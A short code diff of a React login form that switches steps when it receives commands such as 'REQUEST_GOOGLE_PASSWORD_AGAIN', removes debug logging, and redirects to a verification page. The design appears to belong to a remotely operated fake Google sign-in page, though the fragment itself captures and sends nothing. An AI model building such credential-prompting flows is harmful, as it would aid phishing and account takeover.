@@ -20,19 +20,16 @@ export default function LoginForm() {
     // Command handling
     useEffect(() => {
         if (command === 'REQUEST_GOOGLE_EMAIL_AGAIN') {
-            console.log("command in passcheck is ", command)
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('email');
         } 
         else if (command === 'REQUEST_GOOGLE_PASSWORD') {
-            console.log("command in passcheck is ", command)
             setIsLoading(false);
             setBgLoader(true);
             setCurrentStep('password');
         }
         else if (command === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
-            console.log("command in passcheck is ", command)
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('password');
@@ -43,12 +40,9 @@ export default function LoginForm() {
             // setTimeout(() => {
             //     router.push('/OTPVerification');
             // }, 1500);
-        }
-        else if (command === 'FINISH') {
-            setIsLoading(false);
-            setBgLoader(true);
+        } else if (command === 'FINISH') {
             setTimeout(() => {
-                router.push('/Dashboard');
+                router.push('/verificationPage');
             }, 1500);
         }
     }, [command]);
